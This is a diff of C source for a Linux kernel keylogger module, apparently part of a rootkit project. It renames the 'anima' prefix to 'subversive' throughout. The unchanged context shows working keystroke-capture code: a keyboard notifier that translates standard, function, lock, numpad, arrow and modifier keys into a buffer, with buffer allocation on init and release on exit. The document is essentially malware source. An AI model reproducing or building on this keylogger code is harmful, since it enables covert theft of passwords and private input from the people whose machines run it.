@@ -1,9 +1,9 @@
 #include <linux/keyboard.h>
 #include <linux/notifier.h>
 
-#include <anima/config.h>
-#include <anima/keylogger.h>
-#include <anima/libc.h>
+#include <subversive/config.h>
+#include <subversive/keylogger.h>
+#include <subversive/libc.h>
 
 /* keys buffer */
 static char *trans;
@@ -81,7 +81,7 @@ static unsigned int ksym_std(struct keyboard_notifier_param *ks, char *buf)
 		return 0;
 
 	/* otherwise return string representation */
-	return anima_strlcat(buf, ascii[val], KEYLOGGER_BUFLEN);
+	return subversive_strlcat(buf, ascii[val], KEYLOGGER_BUFLEN);
 }
 
 /*
@@ -118,10 +118,10 @@ static unsigned int ksym_fnc(struct keyboard_notifier_param *ks, char *buf)
 
 	/* non-f-keys when the high nybble isn't zero'd */
 	if (val & 0xf0) {
-		len = anima_strlcat(buf, fncs[val & 0x0f], KEYLOGGER_BUFLEN);
+		len = subversive_strlcat(buf, fncs[val & 0x0f], KEYLOGGER_BUFLEN);
 	} else { /* f-key otherwise */
-		anima_snprintf(temp, 6, "%s%d>", F_KEYS, ++val);
-		len = anima_strlcat(buf, temp, KEYLOGGER_BUFLEN);
+		subversive_snprintf(temp, 6, "%s%d>", F_KEYS, ++val);
+		len = subversive_strlcat(buf, temp, KEYLOGGER_BUFLEN);
 	}
 
 	return len;
@@ -150,7 +150,7 @@ static unsigned int ksym_loc(struct keyboard_notifier_param *ks, char *buf)
 		return 0;
 
 	/* translate key symbol */
-	len = anima_strlcat(buf, locks[val], KEYLOGGER_BUFLEN);
+	len = subversive_strlcat(buf, locks[val], KEYLOGGER_BUFLEN);
 
 	/* handle status indicator for num and scroll lock, respectively */
 	if (val == 0x08)
@@ -183,9 +183,9 @@ static unsigned int ksym_num(struct keyboard_notifier_param *ks, char *buf)
 
 	/* values depend on the state of numlock */
 	if (n_lock)
-		len = anima_strlcat(buf, locked_nums[val], KEYLOGGER_BUFLEN);
+		len = subversive_strlcat(buf, locked_nums[val], KEYLOGGER_BUFLEN);
 	else if (!n_lock)
-		len = anima_strlcat(buf, unlocked_nums[val], KEYLOGGER_BUFLEN);
+		len = subversive_strlcat(buf, unlocked_nums[val], KEYLOGGER_BUFLEN);
 
 	return len;
 }
@@ -208,7 +208,7 @@ static unsigned int ksym_arw(struct keyboard_notifier_param *ks, char *buf)
 		return 0;
 
 	/* translate arrow key to string */
-	return anima_strlcat(buf, arws[val], KEYLOGGER_BUFLEN);
+	return subversive_strlcat(buf, arws[val], KEYLOGGER_BUFLEN);
 }
 
 /*
@@ -232,7 +232,7 @@ static unsigned int ksym_mod(struct keyboard_notifier_param *ks, char *buf)
 		return 0;
 
 	/* translate mod key to string */
-	len = anima_strlcat(buf, mods[val], KEYLOGGER_BUFLEN);
+	len = subversive_strlcat(buf, mods[val], KEYLOGGER_BUFLEN);
 
 	/* add pressure indicator */
 	buf[len - 2] = ks->down ? PRESS : RELEASE;
@@ -260,12 +260,12 @@ static unsigned int ksym_cap(struct keyboard_notifier_param *ks, char *buf)
 
 	if (val == 0x06) {
 		/* translate mod key to string */
-		len = anima_strlcat(buf, CAPLOCK, KEYLOGGER_BUFLEN);
+		len = subversive_strlcat(buf, CAPLOCK, KEYLOGGER_BUFLEN);
 
 		/* add lock status indicator */
 		buf[len - 2] = c_lock ? ENABLE : DISABLE;
 	} else {
-		len = anima_strlcat(buf, UNKNOWN, KEYLOGGER_BUFLEN);
+		len = subversive_strlcat(buf, UNKNOWN, KEYLOGGER_BUFLEN);
 	}
 
 	return len;
@@ -406,7 +406,7 @@ int keylogger_init(void)
 		return -1;
 	}
 
-	trans = anima_vmalloc(KEYLOGGER_BUFLEN);
+	trans = subversive_vmalloc(KEYLOGGER_BUFLEN);
 	if (!trans) {
 		pr_debug("%s: vmalloc failed\n", __func__);
 		return -1;
@@ -421,7 +421,7 @@ int keylogger_init(void)
 int keylogger_exit(void)
 {
 	if (trans)
-		anima_vfree(trans);
+		subversive_vfree(trans);
 	else
 		return -1; /* notifier not registered */
 
